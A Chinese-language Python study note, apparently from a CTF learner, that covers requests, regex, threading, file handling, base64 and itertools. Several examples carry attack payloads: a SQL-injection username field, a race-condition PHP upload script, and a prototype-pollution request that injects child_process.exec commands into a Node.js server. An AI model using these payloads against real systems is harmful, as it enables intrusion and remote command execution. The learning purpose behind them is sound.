# 1.库
## requests

- 向网页提交Post数据

```python
register_data = {
        'email':'test@test'+ str(i),
        'username':"0'+ascii(substr((select database()) from %d for 1))+'0"%i,
        'password':123
        }
    r = requests.post(url=register_url,data=register_data)
```

## re

正则表达式

```python
match = re.search(r'<span class="user-name">\s*(\d*)\s*</span>',r.text)
```

## Beautifulsoup

from bs4 import BeautifulSoup

- 最主要的功能是从网页抓取数据

```python
 response_login = requests.post(url2,data=data_login)
 bs = BeautifulSoup(response_login.text, 'html.parser')  # bs4解析页面
username = bs.find('span', class_='user-name')  # 取返回页面数据的span class=user-name属性
number = username.text  # 取该属性的数字
```
## String
```python
print(string.ascii_lowercase + "\n")
print(string.digits + "\n")
```
## ![image.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1667284904397-1bafe434-e575-469b-a783-aad7a0dcea92.png#averageHue=%23292827&clientId=u6fe8c0ee-ede5-4&from=paste&height=55&id=u92a6d92f&originHeight=110&originWidth=530&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11442&status=done&style=none&taskId=u38bcc874-fff3-4f4d-b6b8-20508819331&title=&width=265)
# 2.{}

[Python3 字典 | 菜鸟教程 (runoob.com)](https://www.runoob.com/python3/python3-dictionary.html)

-  表示字典 
```python
d = {key1 : value1, key2 : value2, key3 : value3 }
```
 

# 3.with

-  with关键字，用于处理异常。使用 **with** 关键字系统会自动调用 f.close() 方法， with 的作用等效于 try/finally 语句是一样的
try-finally 
```python
file = open('./test_runoob.txt', 'w')
try:
    file.write('hello world')
finally:
    file.close()
```

with:  

-  一个例子： 
```python
with open(path, 'rb') as fp:
#以二进制格式打开一个文件用于只读
```
 

__name

```python
print("a")
if __name__ == "__main__":
    print("b")
```

- 表示当前.py可以被当作脚本执行，但if后面的语句不能import到其他文件中执行，因为只有当前的name是main。

hash

-  python下字符串为unicode类型，hash传递的需要是utf-8类型 
```python
hashlib.sha1("Salz!".encode("utf-8")).hexdigest()
```
 

-  .hexdigest()表示以16进制返回 

# 4.多线程

```python
import threading
import requests

def thread1():
    url="http://61.147.171.105:62371/upload/info.php"
    for i in range(10000):
        if requests.get(url).status_code == 200 :
            print("yes")

if __name__ == "__main__":
    nums = 32
    threads = []

    for i in range(nums):
        newthread = threading.Thread(target=thread1, args=())
        newthread.start()
        threads.append(newthread)
        print("start {}".format(i)) 
    for t in threads:
        t.join()
```

-  threading.Thread创建线程，args是参数 
-  newthread.start()开始线程 
-  append加入到线程池中 
-  如果t.join()后有代码，表示等待所有线程结束再继续执行，如果没有代码，可以不加这个 
-  如果把join放在上面，即 
```python
 for i in range(nums):
        newthread = threading.Thread(target=thread1, args=())
        newthread.start()
        threads.append(newthread)
        print("start {}".format(i)) 
        newthread.join()
```

这就不会并行执行，等待当前线程执行完再执行，相当于单线程 

## Class实现多线程

[Python3 多线程 | 菜鸟教程 (runoob.com)](https://www.runoob.com/python3/python3-multithreading.html)

```python
import requests
import threading
import os

class RaceCondition(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)

        self.url = 'http://127.0.0.1/poc.php'
        self.uploadUrl = 'http://127.0.0.1/upload.php'

    def _get(self):
        print('try to call uploaded file...')
        r = requests.get(self.url)
        if r.status_code == 200:
            print('[*] create file info.php success.')
            os._exit(0)

    def _upload(self):
        print('upload file...')
        file = {'myfile': open('a.php', 'r')}
        requests.post(self.uploadUrl, files=file)

    def run(self):
        while True:
            for i in range(5):
                self._get()

            for i in range(10):
                self._upload()
                self._get()

if __name__ == '__main__':
    threads = 50    

    for i in range(threads):
        t = RaceCondition()
        t.start()

    for i in range(threads):
        t.join()
```

- 把要执行的代码写到run函数里面 线程在创建后会直接运行run函数

### 类相关知识

- 类的方法与普通的函数只有一个特别的区别——它们必须有一个额外的**第一个参数名称**, 按照惯例它的名称是 self
- self 代表的是类的实例，代表当前对象的地址

### Python内置类属性

- `__dict__ :` 类的属性（包含一个字典，由类的数据属性组成）
- `__doc__`:类的文档字符串
- `__`name__`: 类名
- `__module__`: 类定义所在的模块（类的全名是'**main**.className'，如果类位于一个导入模块mymod中，那么className.**module** 等于 mymod）
- `__bases__`: 类的所有父类构成元素（包含了一个由所有父类组成的元组）

### 单下划线、双下划线、头尾双下划线说明：

- **__foo__**: 定义的是特殊方法，一般是系统定义名字 ，类似 **__init__()** 之类的。
- **_foo**: 以单下划线开头的表示的是 protected 类型的变量，即保护类型只能允许其本身与子类进行访问，不能用于 **from module import ***
- **__foo**: 双下划线的表示的是私有类型(private)的变量, 只能是允许这个类本身进行访问了。

## 多线程库

- `concurrent.futures.ThreadPoolExecutor()`Python标准库 concurrent.futures 中的一个类，它提供了一种使用线程池执行异步任务的方法
```python
import requests
import concurrent.futures

url = "http://example.com/?url="

def test_char(i):
    char = chr(i)
    r = requests.get(f"{url}{char}")
    if "Invalid URL" not in r.text:
        print(f"{i} {char}")
        
with concurrent.futures.ThreadPoolExecutor() as executor:
    for i in range(32, 127):
        executor.submit(test_char, i)
```

- 在 with 语句块中创建 ThreadPoolExecutor 的实例，它会自动管理线程池的生命周期，包括启动线程池和关闭线程池。当 with 语句块结束时，线程池将被自动关闭并回收资源.
- ThreadPoolExecutor 可以使用 submit() 方法向线程池提交任务，这些任务将在一个或多个线程中异步执行。使用 submit() 方法向线程池提交了一系列任务，每个任务都是对 test_char() 函数的调用。
### 并发执行
**方法2：**
```python
tasks = [str(i) for i in range(1, max_num)]
```

- 使用了一个简单的列表推导式（List Comprehension）来生成任务列表，这种方式会一次性生成所有的任务，可能会导致内存占用过高。

**方法3：**

- 下面这个使用生成器动态生成，一次只生成一个任务，可以节约内存。
```python
max_num = 100000
    with concurrent.futures.ThreadPoolExecutor() as executor:
        # 使用生成器动态生成任务
        tasks = (str(i) for i in range(1, max_num))
        # 使用 map 方法并发执行任务
        for _ in executor.map(find_char, tasks):
            pass
```

- 这将生成一个生成器对象，它可以通过迭代器协议（Iterator Protocol）来逐个生成任务。在 ThreadPoolExecutor.map() 方法中，当生成器生成新的任务时，线程池会自动将任务提交给线程池进行执行，直到生成器生成的所有任务都执行完毕。
- **并发是指多个任务在同一时间段内交替执行**
# 5 三引号

[Python3 字符串 | 菜鸟教程 (runoob.com)](https://www.runoob.com/python3/python3-string.html)

- python三引号允许一个字符串跨多行，字符串中可以包含换行符、制表符以及其他特殊字符
- 就是这里面可以直接放Sql语句

# 6 正则表达式

import re

-  group函数 
```python
a  =  "123abc456"
print  re.search( "([0-9]*)([a-z]*)([0-9]*)" ,a).group( 0 )    #123abc456,返回整体
print  re.search( "([0-9]*)([a-z]*)([0-9]*)" ,a).group( 1 )    #123
print  re.search( "([0-9]*)([a-z]*)([0-9]*)" ,a).group( 2 )    #abc
print  re.search( "([0-9]*)([a-z]*)([0-9]*)" ,a).group( 3 )    #456
```
 

   - group(1)就返回匹配第一个括号的部分
-  r开头的正则表达式
python会认为\d这种是转义字符，就不能正常的比配正则了，他不当成\d，为了当成\d，最好在所有的正则匹配前都加r 

#### 例子

```python
match = re.search(r'<span class="user-name">\s*(\d*)\s*</span>',r.text)
```

- \s表示匹配任何空白字符
- \d匹配一个数字字符。等价于 [0-9]
- *表示前面的可以出现0次或多次

# 7. Python f 字符串表达式

-  从 Python 3.6 开始，Python f 字符串可用。 该字符串具有`f`前缀，并使用`{}`评估变量 
```python
name = 'Peter'
age = 23

print('%s is %d years old' % (name, age))
print('{} is {} years old'.format(name, age))
print(f'{name} is {age} years old')
```
 
# 8. 神奇用法
## 输出多个值
```python
print("true+" * 10)
```
## [:-1]
```python
str = 'abcde'
print(str[:-1])
#最后一个位置为-1，输出abcd
print(str[::-1])#反转字符串
```
## 随机生成由'a','b'组成的字符串
```python
import random
def generate_random_str():
    sttr = 'ab'
    str_list = [random.choice(sttr) for i in range(5)]
    random_str = ''.join(str_list)
    return random_str
```
## 随机数
```python
random.randint(0,999999)
```
## 
## 无限循环
```python
while True:
```
## 生成小写字母和数字的函数
```python
import String
print(string.ascii_lowercase + "\n")
print(string.digits + "\n")
```
# 9.常用函数
### strip

- str.[strip](https://so.csdn.net/so/search?q=strip&spm=1001.2101.3001.7020)()  ： 去除字符串两边的空格
- str.lstrip() ： 去除[字符串](https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020)左边的空格
- str.rstrip() ： 去除字符串右边的空格
```python
strip("+")#去除字符串两端的+
```
### ord

- 返回字符的ASCII码
### chr

- 返回十进制ASCII码对应的字符
### base64加解密
#### 加密

```python
def base64_encode(enString):
    encodestr = base64.b64encode(enString.encode('utf-8'))#py3中字符是unicode类型,b64encode的参数是bytes
    print(encodestr)//直接输出是b 'xxx',是byte类型
    rev = str(encodestr,'utf-8')//不带b，将Byte转换成str
    return rev
```
#### 解密
```python
base64.b64decode(str)//这里输出的是带b的
base64.b64decode(str).decode()//这里输出的是str类型的
```
##### 对字符串base64_encode两次
```python
retVal = base64.b64encode(payload.encode('utf-8'))//先把str->bytes
str = base64.b64encode(retVal[::-1]).decode('utf-8')//retVal类型是bytes，为了返回字符串，再decode
```
### join

- 在给定的两个字符串间添加字符
```python
str_list = ['ab','bc','ac]
random_str = ''.join(str_list)
#结果为abbcac
```
# 10. format函数
[https://www.runoob.com/python/att-string-format.html](https://www.runoob.com/python/att-string-format.html)
```python
>>>"{} {}".format("hello", "world")    # 不设置指定位置，按默认顺序
'hello world'
 
>>> "{0} {1}".format("hello", "world")  # 设置指定位置
'hello world'
 
>>> "{1} {0} {1}".format("hello", "world")  # 设置指定位置
'world hello world'
```
# 11.文件操作
```python
public = open('private.key', 'r').read()
```

- 读取文件内容
## 向文件中写
:::info
`f.write()`

:::
```python
import string
s1=string.ascii_lowercase
s2=string.digits
f=open('dict.txt','w')
for i in s1:
	for j in s1:
		for k in s2:
			for l in s2:
				for m in s2:
					p=i+j+k+l+m
					f.write(p+"\n")
f.close()
```
## with语句

- with 语句可以使用 as 子句将上下文管理器的返回值赋给一个变量，这个变量在代码块中可以被访问
- **使用 with 语句可以保证代码块执行完毕后自动清理资源**，不需要手动调用清理函数或者关闭文件等操作，从而减少了代码的出错机会和冗余代码量
### 使用with打开文件
```python
with open('example.txt', 'r') as f:
    content = f.read()
    print(content)
```
## os.path
:::info

1. os.path 是 Python 中用于操作文件路径的模块，它可以让你以平台无关的方式处理文件路径。
2. 在不同操作系统下，文件路径的表示方式可能不同，例如，在 Windows 系统中使用反斜杠 \ 来分隔路径，在 Unix/Linux 系统中使用正斜杠 / 来分隔路径，而在 macOS 系统中则可以使用正斜杠或冒号 : 来分隔路径。
3. os.path 模块提供了一组函数来处理文件路径，例如
   1. os.path.join() 用于将多个路径组合成一个路径
   2. os.path.dirname() 用于获取路径的目录部分
   3. os.path.basename() 用于获取路径的文件名部分，
:::
```python
 current_dir = os.getcwd()
    # 构造一个搜索所有PDF文件的通配符
pdf_glob = os.path.join(current_dir, '*.pdf')

```
## glob.glob
:::info
glob.glob是Python标准库中的一个函数，用于查找匹配特定模式的文件路径名。
:::
```python
# 构造一个搜索所有PDF文件的通配符
pdf_glob = os.path.join(current_dir, '*.pdf')

# 使用glob.glob函数获取所有PDF文件的文件名列表
pdf_files = glob.glob(pdf_glob)

```
## NLTK库
:::info
NLTK（Natural Language Toolkit）是Python中最常用的自然语言处理库之一，它提供了丰富的工具和资源，可以用于文本处理、语言分析、语言学习等任务
:::
## 从pdf中提取单词
```python
def get_words(pdf_file):
	#这里的pdf_file是使用open('example.pdf', 'r')打开的一个文件
    # 创建PyPDF2的PdfFileReader对象
    pdf_reader = PyPDF2.PdfFileReader(pdf_file)

    # 获取PDF文件中的所有页面数量
    num_pages = pdf_reader.getNumPages()

    # 创建一个空字符串，用于存储PDF文件中的所有文本zl
    pdf_text = ''

    # 循环遍历PDF文件中的每一页，并将内容添加到pdf_text中
    for page in range(num_pages):
        page_obj = pdf_reader.getPage(page)
        pdf_text += page_obj.extractText()

        # 使用nltk库的word_tokenize函数将pdf_text中的文本拆分为单词
        words = word_tokenize(pdf_text)

        for word in words:
            sha1 = hashlib.sha1()
            salt_word = word + "Salz!"
            sha1.update(salt_word.encode('utf-8'))
            encoded_text = sha1.hexdigest()
            if(encoded_text == '3fab54a50e770d830c0416df817567662a9dc85c'):
                return word
    return 
```
## 
# 12.Join
```python
var1 = "Hello"
var2 = "World"
 
# join() method is used to combine the strings
print("".join([var1, var2]))
 
# join() method is used here to combine
# the string with a separator Space(" ")
var3 = " ".join([var1, var2])
 
print(var3)
```
# 13.python多行字符串
[Python 字符串 | 菜鸟教程](https://www.runoob.com/python/python-strings.html)

- 正常字符串定义换行得用`\n`
- 用多行字符串就会按照你写的格式输出字符串
```python
str1='aaaaaaaaa\nbbbbb'
str2='''aaaaaa
bbbbb
'''
print(str1)
print(str2)
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/29405061/1676539809760-20e8f1ec-cebf-4f41-b058-7e7c1f9854d3.png#averageHue=%23292827&clientId=u003437a4-0f2f-4&from=paste&height=83&id=u0edea04d&originHeight=166&originWidth=272&originalType=binary&ratio=2&rotation=0&showTitle=false&size=2539&status=done&style=none&taskId=u6b3850de-2809-4500-85cb-e3e6a3bf9bd&title=&width=136)
# 14.post提交文件
:::info

- files的参数是一个字典，字典的key是上传的包中的name，**value必须是一个元组，第一个参数是filename，第二参数是文件对象**
:::

- 这是第一种方式，元组的第二个位置是一个字符串，它将被视为文件内容
```python
url = "http://192.168.56.128:8001"
cmd = 'cat /root/WebstormProjects/untitled1/src/index.js > /root/WebstormProjects/untitled1/2'
r = requests.post(url, files={
    "__proto__.outputFunctionName": (
        None,
        f"x;process.mainModule.require(\'child_process\').exec(\"{cmd}\");x"
    )
})
print(r.request.body)


```

- 这是第二种方式，创建一个文件对象，然后再作为files的参数
```python
url = "http://192.168.56.128:8001"

cmd = 'cat /root/WebstormProjects/untitled1/src/index.js > /root/WebstormProjects/untitled1/2'

x = f"x;process.mainModule.require(\'child_process\').exec(\"{cmd}\");x"
cmd_io = io.StringIO(x)
poc = {"__proto__.outputFunctionName":(None,cmd_io)}
r = requests.post(url, files=poc)
print(r.request.body)

```
# 15.itertools
## 

:::info
itertools 是 Python 标准库中的一个模块，包含了许多用于高效循环迭代的工具函数。
这个模块提供了一些用于生成迭代器的函数，可以帮助你更方便地处理迭代器、组合、排列、笛卡尔积等常见的组合计算问题。

下面是一些常用的 itertools 函数：
count(start=0, step=1)：生成一个无限循环的迭代器，从 start 开始，每次增加 step，可用于产生无限的数字序列。
cycle(iterable)：将一个可迭代对象重复无限次，然后生成一个无限循环的迭代器，可用于反复遍历一个序列。
repeat(elem, n=None)：生成一个重复 elem 元素 n 次的迭代器，如果 n 为 None，则生成一个无限重复的迭代器。
chain(*iterables)：将多个可迭代对象连接成一个迭代器，可用于将多个序列串联起来。
combinations(iterable, r)：生成一个包含所有长度为 r 的组合的迭代器，可用于枚举序列中所有长度为 r 的组合。
permutations(iterable, r=None)：生成一个包含所有长度为 r 的排列的迭代器，如果 r 为 None，则生成包含所有排列的迭代器。
product(*iterables, repeat=1)：生成一个多个可迭代对象的**笛卡尔积**的迭代器，可用于生成多个序列的组合。等等。

- 笛卡尔积就是全排列，每个对象中取一个元素，返回所有可能的情况A*B*C
:::

- 这里学到了`itertools`模块，可以高效的迭代，**不用手动写很多循环**
- 这个代码使用 itertools.product() 函数生成所有可能的由 string 中的字符组合而成的长度为4的组合。
- 这里就相当于写了4个for循环
```python
import itertools
import hashlib

string = "0123456789abcdef"
target_hash = "c578feba1c2e657dba129b4012ccf6a96f8e5f684e2ca358c36df13765da8400"

for aaa in itertools.product(string, repeat=4):
    out1 = hashlib.sha256(''.join(aaa).encode('utf-8')).hexdigest()
    if out1 == target_hash:
        print(''.join(aaa))
```

- 后面的就简单了，有个base32加密，直接用python base32解密就行了
```python
import base64
str = 'GVSTMNDGGQ2DSOLBGUZA===='
decode = base64.b32decode(str.encode('utf-8'))
string1 = decode.decode(encoding)
print(string1)
```

- 如果字节串的编码格式未知，可以使用 chardet 库来自动检测字节串的编码格式
```python
import chardet

byte_string = b'\xe4\xbd\xa0\xe5\xa5\xbd'
encoding = chardet.detect(byte_string)['encoding']
string = byte_string.decode(encoding)
print(string)
```
